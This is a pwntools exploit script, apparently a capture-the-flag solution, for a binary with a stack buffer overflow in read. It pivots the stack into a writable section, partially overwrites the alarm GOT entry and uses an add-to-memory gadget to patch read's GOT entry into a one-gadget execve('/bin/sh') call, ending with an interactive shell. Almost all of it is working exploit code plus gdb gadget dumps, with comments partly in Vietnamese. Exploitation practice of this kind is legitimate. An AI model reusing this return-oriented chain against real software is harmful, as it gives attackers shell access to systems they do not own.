#!/usr/bin/env python3
from hakai import *
from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main+62

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

'''
setvbuf
   0x7ffff7e33cf8 <fputwc_unlocked+72>: pop    rbx
pwndbg>
   0x7ffff7e33cf9 <fputwc_unlocked+73>: pop    r12
   0x7ffff7e33cfb <fputwc_unlocked+75>: pop    rbp
pwndbg>
   0x7ffff7e33cfc <fputwc_unlocked+76>: ret
pwndbg>
'''
'''
setbuf
   0x155555391e09 <__printf_buffer_flush_obstack+57>:   pop    rbx
pwndbg>
   0x155555391e0a <__printf_buffer_flush_obstack+58>:   pop    r12
pwndbg>
   0x155555391e0c <__printf_buffer_flush_obstack+60>:   pop    rbp
pwndbg>
   0x155555391e0d <__printf_buffer_flush_obstack+61>:   ret
'''
'''
   0x00000000004011a2 <+31>:    lea    rax,[rbp-0x100]
   0x00000000004011a9 <+38>:    mov    edx,0x110
   0x00000000004011ae <+43>:    mov    rsi,rax
   0x00000000004011b1 <+46>:    mov    edi,0x0
   0x00000000004011b6 <+51>:    call   0x401050 <read@plt>
'''
'''
   0x1555553f0307 <__GI___confstr+151>: pop    rbx
   0x1555553f0308 <__GI___confstr+152>: pop    r12
   0x1555553f030a <__GI___confstr+154>: pop    rbp
   0x1555553f030b <__GI___confstr+155>: ret

[0x404008] alarm@GLIBC_2.2.5 -> 0x7ffff7cee230 (alarm) ◂— endbr64
'''
wr_section = 0x404e00
read_main = 0x4011A2
pl = b'A'*0x100 + p64(exe.got.alarm + 0x100 + 0x100) + p64(read_main)
sleep(0.3)
s(p, pl)
pl2 = p64(wr_section) + p64(read_main)
pl2 = pl2.ljust(0x100, b'\x00')
pl2 += p64(exe.got.alarm + 0x100) + p64(read_main)
sleep(0.3)
GDB()
s(p, pl2)
input()
s(p, p16(0x0307))
offset = 0x2c582
offset_real = 0xfffd3a7e

"""
0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

"""
leave_ret = 0x4011c0
magic_gadget = 0x40112c #add dword ptr[rbp-0x3d], ebx; nop; ret
### -> ghi vào wr section - 0x100
pl3 = (
    p64(exe.plt.alarm)
    + p64(offset_real)
    + p64(0)
    + p64(exe.got.read + 0x3D)
    + p64(magic_gadget)
    + p64(exe.plt.alarm)   #set điều kiện og
    + p64(0) * 2
    + p64(wr_section + 0x100)
    + p64(exe.plt.read)
)
pl3 = pl3.ljust(0x100)
pl3 += p64(wr_section - 0x100 - 8) + p64(leave_ret)
info(f"og: {hex(offset)}")
input()
# sleep(0.3)
s(p, pl3)
# # 0x404e30 —▸ 0x401040 (alarm@plt) ◂— jmp qword ptr [rip + 0x2fc2]
p.interactive()
